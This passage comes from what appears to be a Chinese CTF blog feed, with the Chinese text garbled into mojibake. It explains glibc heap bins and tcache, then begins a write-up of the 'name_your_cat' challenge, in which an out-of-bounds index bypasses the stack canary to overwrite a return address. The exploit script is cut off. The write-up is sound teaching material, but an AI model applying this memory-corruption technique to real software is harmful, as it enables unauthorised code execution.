ä¼šæ ¹æ®ç©ºé—²çš„ <code>chunk</code> çš„å¤§å°ä»¥åŠä½¿ç”¨çŠ¶æ€ï¼Œå°† <code>chunk</code> åˆæ­¥æ”¾å…¥ç›¸åº”çš„ <code>bin</code> ä¸­ï¼Œ<code>bin</code> çš„ç§ç±»ä¸»è¦åˆ†ä¸ºï¼š</p><ul><li><code>fast bin</code></li><li><code>small bin</code></li><li><code>large bin</code></li><li><code>unsorted bin</code></li><li><code>tcache</code></li></ul><p>Glibc æä¾›äº†ä¸¤ä¸ªæ•°ç»„ï¼š<code>fastbinsY[]</code> å’Œ <code>bins[]</code> ç”¨æ¥å­˜æ”¾è¿™äº› <code>bin</code></p><p>å…·ä½“æ¥è¯´ï¼Œå¯åˆ†ä¸ºï¼š</p><ul><li>10 ä¸ª <code>fast bin</code>ï¼Œå­˜å‚¨åœ¨ <code>fastbinsY[]</code> ä¸­</li><li>1 ä¸ª <code>unsorted bin</code>ï¼Œå­˜å‚¨åœ¨ <code>bins[1]</code> ä¸­</li><li>62 ä¸ª <code>small bin</code>ï¼Œå­˜å‚¨åœ¨ <code>bins[2]</code> è‡³ <code>bins[63]</code> ä¸­</li><li>63 ä¸ª <code>large bin</code>ï¼Œå­˜å‚¨åœ¨ <code>bins[64]</code> è‡³ <code>bins[126]</code> ä¸­</li></ul><p>å…¶ä¸­è™½ç„¶å®šä¹‰äº† <code>bins[128]</code>ï¼Œä½†æ˜¯ <code>bins[0]</code> å’Œ <code>bins[127]</code> å…¶å®æ˜¯ä¸å­˜åœ¨çš„</p><p><code>chunk</code> åœ¨ <code>bin</code> ä¸Šä»¥é“¾è¡¨çš„å½¢å¼å­˜æ”¾ï¼šï¼ˆ<code>fast bin</code> æ˜¯<strong>å•é“¾è¡¨</strong>ï¼Œå…¶ä»–çš„ <code>bin</code> éƒ½æ˜¯<strong>åŒé“¾è¡¨</strong>ï¼‰</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA10.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º10.png"></p><hr><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><blockquote><p><code>fast bin</code> éå¸¸åƒé«˜é€Ÿç¼“å­˜ cacheï¼Œä¸ºäº†å‡å°‘ä¸€äº›è¾ƒå°çš„ <code>chunk</code> åœ¨åˆå¹¶ã€åˆ†å‰²ä»¥åŠä¸­é—´æ£€æŸ¥çš„è¿‡ç¨‹ä¸­çš„å¼€é”€ï¼Œ<code>ptmalloc2</code> ä¸­ä¸“é—¨è®¾è®¡äº† <code>fast bin</code>ï¼Œå¯¹åº”çš„å˜é‡å°±æ˜¯ <code>malloc state</code> ä¸­çš„ <code>fastbinsY[]</code> æ•°ç»„ï¼Œç”¨äºæé«˜å°å†…å­˜åˆ†é…æ•ˆç‡</p></blockquote><ul><li><code>fast bin</code> å­˜å‚¨åœ¨ <code>fastbinsY[]</code> å¤„ï¼Œæ˜¯ 10 ä¸ª<strong>å•é“¾è¡¨</strong>ï¼ˆæœ€å 3 ä¸ªé“¾è¡¨ä¿ç•™æœªä½¿ç”¨ï¼‰</li><li><code>fast bin</code> çš„ <code>chunk</code> å¤§å°ï¼ˆå« <code>chunk</code> å¤´éƒ¨ï¼‰ä¸ºï¼š<code>16 ~ 64</code> å­—èŠ‚ï¼ˆ64 ä½ä¸º <code>32 ~ 128</code> å­—èŠ‚ï¼‰</li><li>ç›¸é‚» <code>bin</code> å­˜æ”¾çš„å¤§å°ç›¸å·® 8 å­—èŠ‚ï¼ˆ64 ä½ä¸º 16 å­—èŠ‚ï¼‰</li><li><strong>é‡‡å– <code>LIFO</code> ç­–ç•¥</strong>ï¼ˆæœ€è¿‘é‡Šæ”¾çš„ <code>chunk</code> ä¼šæ›´æ—©åœ°è¢«åˆ†é…ï¼‰</li><li><code>chunk</code> çš„ <code>PREV_INUSE</code> ä½ï¼ˆä¸‹ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„ <code>chunk</code> çš„ <code>P</code> ä½ï¼‰æ€»ä¸º 1ï¼Œé‡Šæ”¾åˆ° <code>fastbin</code> çš„ <code>chunk</code> ä¸ä¼šè¢«æ¸…é™¤ <code>PREV_INUSE</code> æ ‡å¿—ä½</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA11.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º11.png"></p><p>å¦‚æœé‡åˆ°ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼Œ<code>ptmalloc2</code> ä¼šé¦–å…ˆåˆ¤æ–­ <code>fast bin</code> ä¸­ç›¸åº”çš„ <code>bin</code> ä¸­æ˜¯å¦æœ‰å¯¹åº”å¤§å°çš„ç©ºé—²å—ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±ä¼šç›´æ¥ä»è¿™ä¸ª <code>bin</code> ä¸­è·å– <code>chunk</code>ï¼›å¦‚æœæ²¡æœ‰çš„è¯ï¼Œ<code>ptmalloc2</code> æ‰ä¼šåšæ¥ä¸‹æ¥çš„ä¸€ç³»åˆ—æ“ä½œï¼š</p><ul><li>åœ¨ 32 ä½ç³»ç»Ÿä¸­ï¼ˆ<code>SIZE_SZ = 4</code>ï¼‰ï¼Œç”¨æˆ·éœ€è¦çš„ <code>chunk</code> å¤§å° &lt; 64 å­—èŠ‚</li><li>åœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼ˆ<code>SIZE_SZ = 8</code>ï¼‰ï¼Œç”¨æˆ·éœ€è¦çš„ <code>chunk</code> å¤§å° &lt; 128 å­—èŠ‚</li></ul><p>å…³äº <code>fast bin</code> çš„å¤§å°å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">DEFAULT_MXFAST </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEFAULT_MXFAST</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> </span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> </span><span class="token comment">/* The maximum fastbin request size we support */</span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX_FAST_SIZE</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ 32 ä½ç³»ç»Ÿä¸­ï¼Œ<code>fast bin</code> <strong>é»˜è®¤æ”¯æŒ</strong>æœ€å¤§çš„ <code>chunk</code> çš„æ•°æ®ç©ºé—´å¤§å°ä¸º 64 å­—èŠ‚ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">DEFAULT_MXFAST <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">64</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯å…¶<strong>å¯ä»¥æ”¯æŒ</strong>çš„ <code>chunk</code> çš„æ•°æ®ç©ºé—´æœ€å¤§ä¸º 80 å­—èŠ‚ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">MAX_FAST_SIZE <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">80</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>fast bin</code> æœ€å¤šå¯ä»¥æ”¯æŒçš„ <code>bin</code> çš„ä¸ªæ•°ä¸º 10 ä¸ª</strong>ï¼Œåœ¨ 32 ä½ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·æ•°æ®ç©ºé—´ä»ç¬¬ 8 å­—èŠ‚å¼€å§‹ä¸€ç›´åˆ°ç¬¬ 80 å­—èŠ‚ï¼ˆä¸åŒ…æ‹¬ <code>prev_size</code> å’Œ <code>size</code> å­—æ®µçš„ 8 å­—èŠ‚ï¼‰</p><blockquote><p>æ³¨æ„ï¼š</p><p><strong>fast bin ä¸­çš„ <code>chunk</code> çš„ <code>PREV_INUSE</code> ä½ï¼ˆä¸‹ä¸€ä¸ªç‰©ç†ç›¸é‚»çš„ chunk çš„ P ä½ï¼‰å§‹ç»ˆè¢«ç½®ä¸º 1</strong>ï¼Œå› æ­¤å®ƒä»¬ä¸ä¼šå’Œå…¶å®ƒè¢«é‡Šæ”¾çš„ <code>chunk</code> åˆå¹¶ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå‰é¢è¯´ fast bin æ˜¯ä¸ªç‰¹ä¾‹ï¼Œä¸ä¼šè½»æ˜“åˆå¹¶</p><p>ä½†æ˜¯ï¼Œå½“é‡Šæ”¾çš„ <code>chunk</code> ä¸è¯¥ <code>chunk</code> ç›¸é‚»çš„ç©ºé—² <code>chunk</code> åˆå¹¶åçš„å¤§å° &gt; <code>FASTBIN_CONSOLIDATION_THRESHOLD</code> æ—¶ï¼Œè¯´æ˜å†…å­˜ç¢ç‰‡è¾ƒå¤šï¼Œæ­¤æ—¶å°±éœ€è¦æŠŠ <code>fast bin</code> ä¸­çš„ <code>chunk</code> éƒ½è¿›è¡Œåˆå¹¶ï¼Œä»¥å‡å°‘å†…å­˜ç¢ç‰‡å¯¹ç³»ç»Ÿçš„å½±å“</p></blockquote><hr><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><blockquote><p><code>unsorted bin</code> éå¸¸åƒç¼“å†²åŒº bufferï¼Œå¯ä»¥è§†ä¸ºç©ºé—² <code>chunk</code> å›å½’å…¶æ‰€å± <code>bin</code> ä¹‹å‰çš„ç¼“å†²åŒº</p><p>å¤§å°è¶…è¿‡ <code>fast bin</code> é˜ˆå€¼çš„ <code>chunk</code> è¢«é‡Šæ”¾æ—¶ä¼šåŠ å…¥åˆ°è¿™é‡Œï¼Œè¿™ä½¿å¾— <code>ptmalloc2</code> å¯ä»¥å¤ç”¨æœ€è¿‘é‡Šæ”¾çš„chunkï¼Œä»è€Œæå‡æ•ˆç‡</p></blockquote><ul><li><code>unsorted bin</code> å¤„äº <code>bins[1]</code> å¤„ï¼Œå› æ­¤ <code>unsorted bin</code> åªæœ‰ 1 ä¸ª<strong>åŒå‘å¾ªç¯é“¾è¡¨</strong></li><li><code>unsorted bin</code> ä¸­çš„ç©ºé—² <code>chunk</code> å¤„äº<strong>ä¹±åºçŠ¶æ€</strong></li><li>**<code>unsorted bin</code> åœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œé‡‡ç”¨çš„éå†é¡ºåºæ˜¯ <code>FIFO</code>**ï¼ˆæ’å…¥çš„æ—¶å€™æ’å…¥åˆ° unsorted bin çš„å¤´éƒ¨ï¼Œå–å‡ºçš„æ—¶å€™ä»é“¾è¡¨å°¾è·å–ï¼‰</li><li>åœ¨ <code>malloc</code> åˆ†é…æ—¶ï¼Œå¦‚æœåœ¨ <code>fast bin</code>ã€<code>small bin</code> ä¸­æ‰¾ä¸åˆ°å¯¹åº”å¤§å°çš„ <code>chunk</code>ï¼Œå°±ä¼šå°è¯•ä» <code>unsorted bin</code> ä¸­å¯»æ‰¾ <code>chunk</code>ã€‚å¦‚æœå–å‡ºæ¥çš„ <code>chunk</code> å¤§å°åˆšå¥½æ»¡è¶³ï¼Œå°±ä¼šç›´æ¥è¿”å›ç»™ç”¨æˆ·ï¼›å¦‚æœåœ¨ <code>unsorted bin</code> ä¸­æ²¡æœ‰åˆé€‚çš„ <code>chunk</code>ï¼Œå°±ä¼šæŠŠ <code>unsorted bin</code> ä¸­çš„æ‰€æœ‰ <code>chunk</code> åˆ†åˆ«åŠ å…¥åˆ°æ‰€å±çš„ <code>bin</code> ä¸­ï¼Œç„¶åå†åœ¨ <code>bin</code> ä¸­åˆ†é…åˆé€‚çš„ <code>chunk</code></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA14.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º14.png"></p><blockquote><p>å½“ <code>free</code> çš„ <code>chunk</code> å¤§å° &gt;&#x3D; 144 å­—èŠ‚æ—¶ï¼Œä¸ºäº†æ•ˆç‡ï¼ŒGlibc å¹¶ä¸ä¼šé©¬ä¸Šå°† <code>chunk</code> æ”¾åˆ°ç›¸å¯¹åº”çš„ <code>bin</code> ä¸­ï¼Œè€Œä¼šå…ˆæ”¾åˆ° <code>unsorted bin</code></p><p>ä¸‹æ¬¡ <code>malloc</code> æ—¶ä¼šå…ˆæŸ¥æ‰¾ <code>unsorted bin</code> ä¸­æ˜¯å¦æœ‰åˆé€‚çš„ <code>chunk</code>ï¼Œæ‰¾ä¸åˆ°æ‰ä¼šå»å¯¹åº”çš„ <code>bin</code> ä¸­å¯»æ‰¾ï¼Œæ­¤æ—¶ä¼šé¡ºä¾¿æŠŠ <code>unsorted bin</code> çš„ <code>chunk</code> æ”¾åˆ°å¯¹åº”çš„ <code>bin</code> ä¸­ï¼Œä½† <code>small bin</code> é™¤å¤–ï¼Œä¸ºäº†æ•ˆç‡ï¼Œåâ½½å…ˆä» <code>small bin</code> æ‰¾</p></blockquote><hr><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><blockquote><p><code>chunk size</code> å°äº <code>0x200</code> å­—èŠ‚ï¼ˆ64 ä½ä¸º <code>0x400</code> å­—èŠ‚ï¼‰çš„ <code>chunk</code> å«åš <code>small chunk</code>ï¼Œè€Œ <code>small bin</code> å­˜æ”¾çš„å°±æ˜¯è¿™äº› <code>small chunk</code></p></blockquote><ul><li><code>small bin</code> å­˜å‚¨åœ¨ <code>bins[2]</code> è‡³ <code>bins[63]</code> å¤„ï¼Œæ˜¯ 62 ä¸ª<strong>åŒå‘å¾ªç¯é“¾è¡¨</strong>ï¼ˆæ¯ä¸ªé“¾è¡¨éƒ½æœ‰é“¾è¡¨å¤´ç»“ç‚¹ï¼Œè¿™æ ·å¯ä»¥æ–¹ä¾¿å¯¹äºé“¾è¡¨å†…éƒ¨ç»“ç‚¹çš„ç®¡ç†ï¼‰</li><li><code>fast bin</code> çš„ <code>chunk</code> å¤§å°ï¼ˆå« <code>chunk</code> å¤´éƒ¨ï¼‰ä¸ºï¼š<code>16 ~ 496</code> å­—èŠ‚ï¼ˆ64 ä½ä¸º <code>32 ~ 1008</code> å­—èŠ‚ï¼‰</li><li>ç›¸é‚» <code>bin</code> å­˜æ”¾çš„å¤§å°ç›¸å·® 8 å­—èŠ‚ï¼ˆ64 ä½ä¸º 16 å­—èŠ‚ï¼‰</li><li><em>æ¯ä¸ªé“¾è¡¨ä¸­å­˜å‚¨çš„ <code>chunk</code> å¤§å°éƒ½ä¸€è‡´</em></li><li><strong>é‡‡å– <code>FIFO</code> ç­–ç•¥</strong>ï¼ˆæœ€è¿‘é‡Šæ”¾çš„ <code>chunk</code> ä¼šè¢«æœ€ååˆ†é…ï¼‰ï¼Œè¿™ç‚¹å’Œ <code>fast bin</code> ç›¸å</li><li>åŒæ ·ä¸ <code>fast bin</code> ç›¸åçš„æ˜¯ï¼š<em>ç›¸é‚»çš„ç©ºé—² <code>chunk</code> ä¼šè¢«åˆå¹¶</em></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA12.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º12.png"></p><p><code>small bin</code> ä¸­æ¯ä¸ª <code>chunk</code> çš„å¤§å°ä¸å…¶æ‰€åœ¨çš„ <code>bin</code> çš„ <code>index</code> çš„å…³ç³»ä¸ºï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">chunk_size <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">*</span> index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>small bin</code> çš„å¤§å°å†åˆ†æˆ 62 ä¸ª <code>bin</code>ï¼Œå¤§å°ä» 16 å­—èŠ‚ï¼ˆ64 ä½ä¸º 32 å­—èŠ‚ï¼‰å¼€å§‹ï¼Œæ¯æ¬¡å›ºå®šå¢åŠ  8 å­—èŠ‚ï¼ˆ64 ä½ä¸º 16 å­—èŠ‚ï¼‰ï¼š</p><table><thead><tr><th>ä¸‹æ ‡ index</th><th>SIZE_SZ&#x3D;4ï¼ˆ32 ä½ï¼‰</th><th>SIZE_SZ&#x3D;8ï¼ˆ64 ä½ï¼‰</th></tr></thead><tbody><tr><td>2</td><td>16</td><td>32</td></tr><tr><td>3</td><td>24</td><td>48</td></tr><tr><td>4</td><td>32</td><td>64</td></tr><tr><td>5</td><td>40</td><td>80</td></tr><tr><td><code>x</code></td><td><code>2 * 4 * x</code></td><td><code>2 * 8 * x</code></td></tr><tr><td>63</td><td>504</td><td>1008</td></tr></tbody></table><blockquote><p>æ³¨æ„ï¼š</p><p><code>fast bin</code> ä¸­çš„ <code>chunk</code> æ˜¯æœ‰å¯èƒ½è¢«æ”¾åˆ° <code>small bin</code> ä¸­å»çš„</p></blockquote><hr><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><blockquote><p><code>large bin</code> å­˜æ”¾çš„æ˜¯å¤§äºç­‰äº <code>0x200</code> å­—èŠ‚ï¼ˆ64 ä½ä¸º <code>0x400</code> å­—èŠ‚ï¼‰çš„ <code>chunk</code></p></blockquote><ul><li><code>large bin</code> å­˜å‚¨åœ¨ <code>bins[64]</code> è‡³ <code>bins[126]</code> å¤„ï¼Œæ˜¯ 63 ä¸ª<strong>åŒå‘å¾ªç¯é“¾è¡¨</strong></li><li><em>æ¯ä¸ª bin ä¸­çš„ chunk çš„å¤§å°ä¸ä¸€è‡´ï¼ˆæŒ‰å¤§å°é™åºæ’åˆ—ï¼‰</em></li><li><strong>é‡‡å– <code>FIFO</code> ç­–ç•¥</strong></li><li>æ’å…¥å’Œåˆ é™¤å¯ä»¥å‘ç”Ÿåœ¨ä»»æ„ä½ç½®</li><li>ç›¸é‚»ç©ºé—² <code>chunk</code> ä¼šè¢«åˆå¹¶</li></ul><p><code>large bin</code> çš„ <code>freed chunk</code> ä¼šå¤šä¸¤ä¸ªæŒ‡é’ˆ <code>fd_nextsize</code>ã€<code>bk_nextsize</code>ï¼Œåˆ†åˆ«æŒ‡å‘å‰ä¸€å—å’Œåä¸€å— <code>large chunk</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA13.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º13.png"></p><p><code>large bin</code> çš„å¤§å°å†åˆ†æˆ 63 ä¸ª <code>bin</code>ï¼Œä½†å¤§å°ä¸å†æ˜¯å›ºå®šå¤§å°å¢åŠ ï¼Œè€Œæ˜¯æŒ‰ç…§å…¬å·®åˆ†ä¸º 6 ç»„ï¼š</p><table><thead><tr><th>ç»„</th><th>bin çš„æ•°é‡</th><th>å…¬å·®</th></tr></thead><tbody><tr><td>1</td><td>32</td><td>0x40</td></tr><tr><td>2</td><td>16</td><td>0x200</td></tr><tr><td>3</td><td>8</td><td>0x1000</td></tr><tr><td>4</td><td>4</td><td>0x8000</td></tr><tr><td>5</td><td>2</td><td>0x40000</td></tr><tr><td>6</td><td>1</td><td>ä¸é™åˆ¶ï¼Œå¤§å°å’Œ large bin å‰©ä½™çš„å¤§å°ç›¸åŒ</td></tr></tbody></table><hr><h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><blockquote><p><code>tcache</code> æ˜¯ libc2.26ï¼ˆUbuntu 17.10ï¼‰ä¹‹åå¼•è¿›çš„ä¸€ç§æ–°æœºåˆ¶ï¼Œç±»ä¼¼äº <code>fast bin</code> ä¸€æ ·çš„ä¸œè¥¿ï¼Œç›®çš„æ˜¯æå‡å †ç®¡ç†çš„æ€§èƒ½ï¼Œä½†æå‡æ€§èƒ½çš„åŒæ—¶èˆå¼ƒäº†å¾ˆå¤šå®‰å…¨æ£€æŸ¥ï¼Œä¹Ÿå› æ­¤æœ‰äº†å¾ˆå¤šæ–°çš„åˆ©ç”¨æ–¹å¼</p></blockquote><ul><li>æ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª <code>chunk</code></li><li><code>malloc</code> çš„æ—¶å€™ä¼˜å…ˆå» <code>tcache</code> æ‰¾</li><li><code>free</code> çš„æ—¶å€™å½“ <code>tcache</code> æ»¡äº†æ‰æ”¾å…¥ <code>fastbin</code> æˆ– <code>unsorted bin</code></li></ul><p>åŸºæœ¬å·¥ä½œæ–¹å¼ï¼š</p><ul><li><p><code>malloc</code> æ—¶ï¼Œä¼šå…ˆ <code>malloc</code> ä¸€å—å†…å­˜ç”¨æ¥å­˜æ”¾ <code>tcache_perthread_struct</code></p></li><li><p><code>free</code> å†…å­˜ï¼Œä¸” <code>size</code> å°äº <code>small bin size</code> æ—¶</p><ol><li>å…ˆæ”¾åˆ°å¯¹åº”çš„ <code>tcache</code> ä¸­ï¼Œç›´åˆ° <code>tcache</code> è¢«å¡«æ»¡ï¼ˆé»˜è®¤æ˜¯ 7 ä¸ªï¼‰</li><li><code>tcache</code> è¢«å¡«æ»¡ä¹‹åï¼Œå†æ¬¡ <code>free</code> çš„å†…å­˜å’Œä¹‹å‰ä¸€æ ·è¢«æ”¾åˆ° <code>fast bin</code> æˆ–è€… <code>unsorted bin</code> ä¸­</li><li><code>tcache</code> ä¸­çš„ <code>chunk</code> ä¸ä¼šåˆå¹¶ï¼ˆä¸å–æ¶ˆ <code>PREV_INUSE</code> ä½ï¼‰</li></ol></li><li><p><code>malloc</code> å†…å­˜ï¼Œä¸” <code>size</code> åœ¨ <code>tcache</code> èŒƒå›´å†…</p><ol><li>å…ˆä» <code>tcache</code> å– <code>chunk</code>ï¼Œç›´åˆ° <code>tcache</code> ä¸ºç©º</li><li><code>tcache</code> ä¸ºç©ºåï¼Œä» <code>bin</code> ä¸­æ‰¾</li><li><code>tcache</code> ä¸ºç©ºæ—¶ï¼Œå¦‚æœ <code>fast bin</code>ã€<code>small bin</code>ã€<code>unsorted bin</code> ä¸­æœ‰ <code>size</code> ç¬¦åˆçš„ <code>chunk</code>ï¼Œä¼šå…ˆæŠŠ <code>fast bin</code>ã€<code>small bin</code>ã€<code>unsorted bin</code> ä¸­çš„ <code>chunk</code> æ”¾åˆ° <code>tcache</code> ä¸­ï¼Œç›´åˆ°å¡«æ»¡ï¼›ä¹‹åå†ä» <code>tcache</code> ä¸­å–ï¼›å› æ­¤ <code>chunk</code> åœ¨ <code>bin</code> ä¸­å’Œ <code>tcache</code> ä¸­çš„é¡ºåºä¼šåè¿‡æ¥</li></ol></li></ul><hr>]]></content>
    
    
    <summary type="html">éƒ½è¯´ PWN çš„ä¸–ç•Œåˆ†ä¸ºæ ˆã€å †å’Œå†…æ ¸ï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦ä»‹ç»äº†å †è¿™ç§æ•°æ®ç»“æ„çš„ç›¸å…³æ¦‚å¿µï¼Œä½œä¸ºå †åˆ©ç”¨çš„å‰ç½®åŸºç¡€</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>ã€wustctf 2020ã€‘name_your_cat</title>
    <link href="https://www.uf4te.cn/posts/35b1366d.html"/>
    <id>https://www.uf4te.cn/posts/35b1366d.html</id>
    <published>2024-05-14T15:35:36.000Z</published>
    <updated>2024-06-05T06:36:47.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h1><ul><li><mark>åˆ©ç”¨æ•°ç»„ä¸‹æ ‡è¶Šç•Œå®ç°ç»•è¿‡ Canary ä¿®æ”¹æ ˆä¸Šçš„è¿”å›å€¼</mark></li></ul><hr><p><a href="https://buuoj.cn/challenges#wustctf2020_name_your_cat">ã€wustctf2020ã€‘name_your_cat</a></p><hr><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>æŸ¥çœ‹ä¿æŠ¤ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat1.png" alt="ã€wustctf2020ã€‘name_your_cat1.png"></p><p>åœ¨ IDA ä¸‹åˆ†æï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat2.png" alt="ã€wustctf2020ã€‘name_your_cat2.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat3.png" alt="ã€wustctf2020ã€‘name_your_cat3.png"></p><p>è¿™é‡Œå¾ªç¯äº† 5 æ¬¡ï¼Œå…³é”®åœ¨äº <code>NameWhich()</code> å‡½æ•°</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat4.png" alt="ã€wustctf2020ã€‘name_your_cat4.png"></p><p>åœ¨ <code>NameWhich()</code> ä¸­é¦–å…ˆè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªæ•°å­˜æ”¾åˆ° <code>v2</code> åœ°å€å¤„ï¼Œç”±äº <code>v2</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„åä»£è¡¨æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„åœ°å€ï¼Œå› æ­¤å…¶å®æ˜¯è®©æˆ‘ä»¬è¾“å…¥ <code>v2[0]</code> çš„å€¼</p><p>ç„¶åè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªæœ€å¤š 7 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²å­˜æ”¾åœ¨ <code>8 * v2[0] + a1</code> åœ°å€å¤„ï¼Œç”±äº <code>a1</code> æ˜¯ä½œä¸º char å‹æ•°ç»„ <code>v3</code> çš„å½¢å‚ï¼Œå› æ­¤è¿™é‡Œæ˜¯è®©æˆ‘ä»¬è¾“å…¥ <code>v3[8 * v2[0]]</code> çš„å€¼</p><p>å­˜åœ¨ä¸€ä¸ªåé—¨å‡½æ•° <code>shell()</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat5.png" alt="ã€wustctf2020ã€‘name_your_cat5.png"></p><p>æŸ¥çœ‹æ ˆä¸­çš„å¸ƒå±€ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90wustctf2020%E3%80%91name_your_cat6.png" alt="ã€wustctf2020ã€‘name_your_cat6.png"></p><p>ç”±äºå­˜åœ¨ Canaryï¼Œä¸”æ²¡æœ‰å…¶ä»–çš„æº¢å‡ºç‚¹</p><p>ä½†è€ƒè™‘åˆ°æˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥ <code>v3[8 * v2[0]]</code> çš„å€¼æ§åˆ¶ <code>v3[]</code> æ•°ç»„ï¼ŒåŒæ—¶ç¨‹åºæ²¡æœ‰å¯¹æ•°ç»„è¾¹ç•Œè¿›è¡Œæ£€æŸ¥</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ <code>v3[]</code> æ•°ç»„çš„ä¸‹æ ‡è¶Šç•Œï¼Œè¿›è€Œç»•è¿‡ Canary ä¿®æ”¹æ ˆä¸Šçš„è¿”å›å€¼</p><p><code>v3</code> é¦–åœ°å€è·ç¦»æ ˆä¸Šçš„è¿”å›åœ°å€ <code>0x34 + 0x4 = 0x38</code>ï¼Œå½“ <code>v2[0] = 0</code> æ—¶å³å¯¹åº” <code>v3</code> çš„é¦–åœ°å€</p><p>å› æ­¤è¦ä¿®æ”¹è¿”å›åœ°å€çš„è¯ï¼Œ<code>v2[0]</code> åº”è¯¥ç­‰äº <code>0x38 / 8 = 7</code></p><hr><h1 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token 